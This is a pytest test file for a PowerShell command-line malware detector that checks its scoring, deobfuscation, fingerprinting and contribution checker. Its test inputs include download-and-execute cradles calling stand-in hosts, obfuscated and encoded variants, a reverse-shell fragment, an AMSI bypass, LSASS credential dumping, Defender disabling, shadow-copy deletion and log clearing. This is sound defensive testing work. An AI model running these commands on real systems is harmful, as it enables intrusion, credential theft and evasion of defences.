import base64
import gzip
import json

import pytest

from powerdetect import analyze
from powerdetect.__main__ import main


def enc(script: str) -> str:
    return base64.b64encode(script.encode("utf-16-le")).decode()


CRADLE = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a.ps1')"


@pytest.mark.parametrize("cmd", [
    "Get-ChildItem C:\\Users -Recurse | Measure-Object",
    "powershell.exe -NoProfile -Command \"Get-Service | Where-Object Status -eq Running\"",
    "powershell -ExecutionPolicy Bypass -File C:\\scripts\\backup.ps1",
    "Import-Module ActiveDirectory; Get-ADUser -Filter * | Export-Csv users.csv",
])
def test_benign_is_low(cmd):
    assert analyze(cmd).verdict == "LOW", analyze(cmd).hits


def test_plain_cradle():
    r = analyze(f"powershell -nop -w hidden -c \"{CRADLE}\"")
    assert r.verdict == "MALICIOUS"
    ids = {h.id for h in r.hits}
    assert {"PD-D001", "PD-E001", "PD-H002", "PD-D005"} <= ids
    assert "http://203.0.113.5/a.ps1" in r.iocs["urls"]


@pytest.mark.parametrize("flag", ["-e", "-enc", "-EncodedCommand", "/ec", "-eNcOdEdCoMmAnD", "-encod"])
def test_encoded_variants(flag):
    r = analyze(f"powershell.exe -NoP -W 1 {flag} {enc(CRADLE)}")
    assert r.verdict == "MALICIOUS"
    assert "downloadstring" in r.layers[0]["text"].lower()


def test_tick_concat_format_obfuscation():
    s = ("&('I'+'E'+'X') (New-Object ('Ne'+'t.W'+'ebCl'+'ient')).(\"{1}{0}\" -f 'String','Download')"
         "('ht'+'tp://evil.example/x')")
    r = analyze(s)
    final = r.layers[-1]["text"].lower()
    assert "'net.webclient'" in final and "'downloadstring'" in final
    assert r.verdict == "MALICIOUS"
    assert "format-operator" in r.obfuscation


def test_backticks():
    r = analyze("I`E`X (N`ew-Ob`ject Net.W`ebClient).Do`wnloadStr`ing('http://x.example/a')")
    assert "tick-obfuscation" in r.obfuscation
    assert r.verdict == "MALICIOUS"


def test_char_codes():
    r = analyze("& ([char]73+[char]69+[char]0x58) 'whoami'")
    assert "'IEX'" in r.layers[-1]["text"]
    r2 = analyze("$c = -join [char[]](105,101,120); & $c")
    assert "'iex'" in r2.layers[-1]["text"]


def test_reversal_and_replace():
    r = analyze("$a = ('gnirtSdaolnwoD'[-1..-14] -join ''); $b = 'NeXXt.WebClient'.Replace('XX','')")
    t = r.layers[-1]["text"]
    assert "'DownloadString'" in t and "'Net.WebClient'" in t
    r2 = analyze("New-Object ('NeZZt.Web'+'CliZZent').Replace('ZZ','')")
    assert "'Net.WebClient'" in r2.layers[-1]["text"]


def test_gzip_base64_layer():
    inner = "$c=New-Object Net.Sockets.TCPClient('198.51.100.7',443);$s=$c.GetStream();iex 'x'"
    blob = base64.b64encode(gzip.compress(inner.encode())).decode()
    outer = (f"IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream("
             f"(New-Object IO.MemoryStream(,[Convert]::FromBase64String('{blob}'))),"
             f"[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()")
    r = analyze(f"powershell -enc {enc(outer)}")
    assert "compressed-payload" in r.obfuscation
    assert any(h.id == "PD-N001" for h in r.hits)
    assert "198.51.100.7" in r.iocs["ips"]
    assert r.verdict == "MALICIOUS"


def test_nested_encoded():
    inner = enc("Set-MpPreference -DisableRealtimeMonitoring $true")
    r = analyze(f"powershell -enc {enc(f'powershell.exe -w hidden -enc {inner}')}")
    assert "nested-encoded-command" in r.obfuscation
    assert any(h.id == "PD-V002" for h in r.hits)


def test_cmd_caret():
    r = analyze("cmd.exe /c p^ower^shell -w h^idden -c \"vssadmin delete shadows /all /quiet\"")
    assert r.host == "powershell"
    assert any(h.id == "PD-X001" for h in r.hits)


@pytest.mark.parametrize("cmd,rid", [
    ("[Ref].Assembly.GetType('System.Management.Automation.'+'AmsiUtils').GetField('amsi'+'InitFailed','NonPublic,Static').SetValue($null,$true)", "PD-V001"),
    ("rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\l.dmp full", "PD-C002"),
    ("Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'", "PD-C001"),
    ("powershell -version 2 -c whoami", "PD-H004"),
    ("wevtutil cl Security", "PD-V004"),
])
def test_specific_rules(cmd, rid):
    assert rid in {h.id for h in analyze(cmd).hits}


def test_deterministic():
    cmd = f"powershell -enc {enc(CRADLE)}"
    a, b = analyze(cmd).to_dict(), analyze(cmd).to_dict()
    assert a == b


def test_cli_csv_and_exit_code(tmp_path, capsys):
    p = tmp_path / "hunt.csv"
    p.write_text("Timestamp,DeviceName,ProcessCommandLine\n"
                 f"2026-11-10,PC1,\"powershell -enc {enc(CRADLE)}\"\n"
                 "2026-11-10,PC2,\"powershell -c Get-Date\"\n", encoding="utf-8")
    code = main(["--csv", str(p), "-o", "jsonl"])
    lines = [json.loads(l) for l in capsys.readouterr().out.splitlines()]
    assert [l["verdict"] for l in lines] == ["MALICIOUS", "LOW"]
    assert code == 2


def test_cli_alert_json(tmp_path, capsys):
    p = tmp_path / "alert.json"
    p.write_text(json.dumps({"value": [{"evidence": [{"processCommandLine": "wevtutil cl System"}]}]}))
    main(["--json", str(p), "-o", "json"])
    out = json.loads(capsys.readouterr().out)
    assert out[0]["hits"][0]["id"] == "PD-V004"


# ---------------------------------------------------------------- statements / why
def test_split_statements():
    from powerdetect.statements import split_statements
    t = "$a='x;y'; Get-Date\nif ($b -eq (1;2)) { whoami; hostname }"
    parts = [t[a:b] for a, b in split_statements(t)]
    assert parts == ["$a='x;y'", "Get-Date", "if ($b -eq (1;2))", "whoami", "hostname"]


def test_rules_attributed_to_statement():
    r = analyze("Get-Date; $w=New-Object Net.WebClient; Write-Host hi; iex $w.DownloadString('http://x.example/a')")
    flagged = {s.index: s.rules for s in r.flagged_statements}
    assert 0 not in flagged and 2 not in flagged          # Get-Date, Write-Host are clean
    assert "PD-D001" in flagged[1]                           # New-Object Net.WebClient
    assert {"PD-E001", "PD-D001"} <= set(flagged[3])         # iex ... DownloadString


def test_host_flags_statement():
    r = analyze("powershell -w hidden -enc " + enc("Get-Date"))
    host = r.statements[0]
    assert host.layer is None and {"PD-H001", "PD-H002"} <= set(host.rules)


def test_every_rule_hit_is_attributed():
    r = analyze(f"powershell -nop -w hidden -enc {enc(CRADLE)}")
    attributed = {rid for s in r.statements for rid in s.rules}
    assert attributed == {h.id for h in r.hits if h.kind == "rule"}
    assert all(h.statements for h in r.hits if h.kind == "rule")


# ---------------------------------------------------------------- fingerprints
VARIANTS = [
    "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a.ps1')",
    "I`E`X (New-Object Net.W`ebClient).Do`wnloadStr`ing('http://evil.example/b.ps1')",
    "&('I'+'EX') (New-Object ('Ne'+'t.WebClient')).('Download'+'String')('http://x.example/c')",
    "iex (new-object NET.WEBCLIENT).downloadstring(\"http://198.51.100.1:8080/x\")",
    "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://a.example/q')",
]


def test_structural_fingerprint_survives_obfuscation():
    fps = {analyze(v).fingerprints["structural"] for v in VARIANTS}
    assert len(fps) == 1


def test_encoded_wrapper_same_payload_fingerprint():
    a = analyze(VARIANTS[0])
    b = analyze(f"powershell -nop -w hidden -enc {enc(VARIANTS[1])}")
    assert a.fingerprints["payload"] == b.fingerprints["payload"]
    assert a.fingerprints["behavior"] != b.fingerprints["behavior"]  # flags differ


def test_variable_names_abstracted():
    a = analyze("$wc=New-Object Net.WebClient; iex $wc.DownloadString('http://a.example/1')")
    b = analyze("$zzz=New-Object Net.WebClient; iex $zzz.DownloadString('http://b.example/2')")
    assert a.fingerprints["structural"] == b.fingerprints["structural"]
    assert a.fingerprints["exact"] != b.fingerprints["exact"]


def test_different_behaviour_different_fingerprint():
    a = analyze(VARIANTS[0])
    b = analyze("IEX (New-Object Net.WebClient).DownloadFile('http://a.example/x','C:\\x.exe')")
    assert a.fingerprints["structural"] != b.fingerprints["structural"]


def test_known_db_label_and_allowlist(tmp_path):
    from powerdetect import Rules
    from powerdetect.fingerprint import FingerprintDB
    fp_bad = analyze(VARIANTS[0]).fingerprints["structural"]
    sccm = "powershell -NoProfile -EncodedCommand " + enc("Get-WmiObject Win32_OperatingSystem")
    fp_ok = analyze(sccm).fingerprints["structural"]
    db_file = tmp_path / "known.toml"
    db_file.write_text(
        f'[[fingerprint]]\ntype="structural"\nvalue="{fp_bad}"\nlabel="WebClient cradle"\nverdict="MALICIOUS"\n'
        f'[[fingerprint]]\ntype="structural"\nvalue="{fp_ok}"\nlabel="SCCM inventory"\nverdict="LOW"\n')
    db = FingerprintDB(db_file)
    r = analyze(VARIANTS[2], Rules(), db)
    assert r.known[0]["label"] == "WebClient cradle" and r.verdict_source == "fingerprint-db"
    assert analyze(sccm, Rules(), db).verdict == "LOW"


def test_cli_summary_and_export(tmp_path, capsys):
    f = tmp_path / "cmds.txt"
    f.write_text("\n".join(VARIANTS + ["Get-Date"]), encoding="utf-8")
    out_toml = tmp_path / "fp.toml"
    code = main(["-f", str(f), "--no-color", "-q", "--export-fingerprints", str(out_toml)])
    out = capsys.readouterr().out
    assert code == 2
    assert "Possibly malicious commands (5)" in out
    assert "x5" in out and "why:" in out and "Reasons by ATT&CK tactic" in out
    assert "Get-Date" not in out.split("SUMMARY")[0]          # -q hides LOW
    import tomllib
    data = tomllib.loads(out_toml.read_text(encoding="utf-8"))
    assert len(data["fingerprint"]) == 1


# ---------------------------------------------------------------- corpora (regression)
from pathlib import Path  # noqa: E402

DATA = Path(__file__).parent / "data"


def load_corpus(name):
    out = []
    for line in (DATA / name).read_text(encoding="utf-8").splitlines():
        if not line.strip() or line.startswith("#"):
            continue
        if line.startswith("ENC: "):
            line = ("powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass "
                    f"-WindowStyle Hidden -EncodedCommand {enc(line[5:])}")
        out.append(line)
    return out


@pytest.mark.parametrize("cmd", load_corpus("benign.txt"))
def test_benign_corpus_is_low(cmd):
    r = analyze(cmd)
    assert r.verdict == "LOW", (r.score, [h.id for h in r.hits])


@pytest.mark.parametrize("cmd", load_corpus("borderline.txt"))
def test_borderline_never_malicious(cmd):
    r = analyze(cmd)
    assert r.verdict != "MALICIOUS", (r.score, [h.id for h in r.hits])


# ---------------------------------------------------------------- brain
def test_critical_floor_forces_verdict():
    r = analyze("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')")
    assert r.verdict == "MALICIOUS" and r.score < 70
    assert "forces at least MALICIOUS" in r.verdict_reason


def test_combo_download_inmemory():
    r = analyze("$c = (iwr http://x.example/p.ps1).Content; $sb = [scriptblock]::Create($c); & $sb")
    assert "CB-DL-INMEM" in {h.id for h in r.hits}
    combo = next(h for h in r.hits if h.id == "CB-DL-INMEM")
    assert combo.kind == "combo" and combo.why and "PD-D002" in combo.evidence


def test_killchain_bonus():
    r = analyze("Set-MpPreference -DisableRealtimeMonitoring $true; "
                "New-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name u -Value x; "
                "IEX (New-Object Net.WebClient).DownloadString('http://x.example/a')")
    kc = next(h for h in r.hits if h.kind == "killchain")
    assert "Persistence" in kc.evidence and "Defense Impairment" in kc.evidence


def test_explanation_fields():
    r = analyze(CRADLE)
    assert r.assessment.startswith("Observed behaviour")
    assert "Command and Control" in r.assessment
    assert all(h.why for h in r.hits)
    assert "command-and-control" in r.tactics
    low = analyze("Get-Date")
    assert "No known attack behaviour" in low.assessment


def test_attribution_prefers_single_statement():
    r = analyze("Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath C:\\x")
    hit = next(h for h in r.hits if h.id == "PD-V002B")
    assert hit.statements == ["L0#1"]


def test_host_must_be_first_token():
    r = analyze('sc config Fax binPath= "C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -c whoami"')
    assert r.host is None
    assert "PD-P004B" in {h.id for h in r.hits}


def test_clickfix_and_defender_aliases():
    assert "PD-E010" in {h.id for h in analyze("Get-Clipboard | iex").hits}
    r = analyze("Set-MpPreference -drtm $True")
    assert r.verdict == "MALICIOUS"


def test_rules_file_is_valid():
    from powerdetect import Rules
    rules = Rules()
    assert len(rules.rules) > 80
    for r in rules.rules + rules.combos:
        assert r["why"].strip() and (r["tactic"] in rules.tactics or r["tactic"] == "multiple")


# ---------------------------------------------------------------- web API (used by the website)
def test_webapi_matches_cli_engine():
    from powerdetect import webapi
    webapi.init()
    cmds = [CRADLE, "Get-Date", f"powershell -enc {enc(CRADLE)}"]
    out = json.loads(webapi.run("\n".join(cmds), "lines", False))
    assert [r["verdict"] for r in out["reports"]] == [analyze(c).verdict for c in cmds]
    assert [r["score"] for r in out["reports"]] == [analyze(c).score for c in cmds]
    assert out["counts"]["MALICIOUS"] == 2 and out["clusters"][0]["count"] == 2


def test_webapi_csv_json_and_export():
    from powerdetect import webapi
    webapi.init()
    csv_text = "﻿Timestamp,ProcessCommandLine\n1,wevtutil cl System\n2,Get-Date\n"
    out = json.loads(webapi.run(csv_text, "csv", False))
    assert [r["verdict"] for r in out["reports"]] == ["MALICIOUS", "LOW"]
    js = json.dumps({"value": [{"evidence": [{"processCommandLine": "wevtutil cl System"}]}]})
    assert json.loads(webapi.run(js, "json", False))["counts"]["MALICIOUS"] == 1
    import tomllib
    assert len(tomllib.loads(webapi.export_fingerprints())["fingerprint"]) == 1


def test_verbose_run_through(capsys):
    main(["--no-color", "-v", "Get-Date; iex 'x'"])
    out = capsys.readouterr().out
    assert "Run-through" in out and "! [L0#1]" in out and "  [L0#0] Get-Date" in out


# ---------------------------------------------------------------- contributed fingerprints
import sys as _sys  # noqa: E402

_sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "tools"))
import check_fingerprints  # noqa: E402

CONTRIB_SAMPLE = f"powershell -nop -w hidden -c \"{CRADLE}\""


def _entry(**over):
    from powerdetect.fingerprint import toml_str
    e = {"type": "structural", "value": analyze(CONTRIB_SAMPLE).fingerprints["structural"],
         "label": "Test cradle", "verdict": "MALICIOUS", "sample": CONTRIB_SAMPLE}
    e.update(over)
    body = "\n".join(f"{k} = {toml_str(v) if isinstance(v, str) else v}" for k, v in e.items())
    return f"[[fingerprint]]\n{body}\n"


def test_community_folder_passes_checker():
    problems, _ = check_fingerprints.check([check_fingerprints.COMMUNITY])
    assert problems == []


def test_checker_accepts_valid_entry(tmp_path):
    f = tmp_path / "ok.toml"
    f.write_text(_entry(mitre="T1059.001, T1105", reference="https://example.com/x"), encoding="utf-8")
    assert check_fingerprints.check([f])[0] == []


@pytest.mark.parametrize("over, expect", [
    ({"value": "0123456789abcdef"}, "fingerprint is"),
    ({"verdict": "LOW"}, "contributions must be"),
    ({"type": "behavior"}, "type 'behavior'"),
    ({"label": "TODO"}, "real label"),
    ({"mitre": "execution"}, "not an ATT&CK technique"),
    ({"reference": "http://example.com"}, "https://"),
    ({"colour": "red"}, "unknown keys"),
])
def test_checker_rejects(tmp_path, over, expect):
    f = tmp_path / "bad.toml"
    f.write_text(_entry(**over), encoding="utf-8")
    problems = check_fingerprints.check([f])[0]
    assert any(expect in p for p in problems), problems


def test_checker_rejects_known_good_match(tmp_path):
    good = "Get-Service | Where-Object Status -eq Running"
    f = tmp_path / "broad.toml"
    f.write_text(_entry(sample=good, value=analyze(good).fingerprints["structural"]), encoding="utf-8")
    problems = check_fingerprints.check([f])[0]
    assert any("known-good" in p for p in problems), problems


def test_checker_rejects_duplicates(tmp_path):
    f = tmp_path / "dup.toml"
    f.write_text(_entry() + "\n" + _entry(label="Same again"), encoding="utf-8")
    assert any("duplicate" in p for p in check_fingerprints.check([f])[0])


def test_db_loads_folders_and_several_paths(tmp_path):
    from powerdetect.fingerprint import FingerprintDB
    (tmp_path / "a.toml").write_text(_entry(), encoding="utf-8")
    (tmp_path / "_skip.toml").write_text("not toml at all [", encoding="utf-8")
    other = tmp_path / "other.toml"
    other.write_text(_entry(type="payload", value=analyze(CONTRIB_SAMPLE).fingerprints["payload"]),
                     encoding="utf-8")
    db = FingerprintDB(tmp_path, other)
    assert len(db.entries) == 3  # a.toml + other.toml (again, via the folder) + other.toml
    r = analyze(CONTRIB_SAMPLE, db=db)
    assert r.known and r.known[0]["label"] == "Test cradle"


def test_export_is_a_valid_contribution_after_labelling(tmp_path):
    import tomllib
    src = tmp_path / "cmds.txt"
    src.write_text(CONTRIB_SAMPLE + "\n", encoding="utf-8")
    out = tmp_path / "export.toml"
    main(["-f", str(src), "--no-color", "-q", "--export-fingerprints", str(out)])
    data = tomllib.loads(out.read_text(encoding="utf-8"))
    assert data["fingerprint"][0]["sample"] == CONTRIB_SAMPLE
    assert "T1059.001" in data["fingerprint"][0]["mitre"]
    labelled = out.read_text(encoding="utf-8").replace('label = "TODO"', 'label = "Test cradle"')
    contrib = tmp_path / "contrib.toml"
    contrib.write_text("\n".join(l for l in labelled.splitlines() if not l.startswith("#")),
                       encoding="utf-8")
    assert check_fingerprints.check([contrib])[0] == []
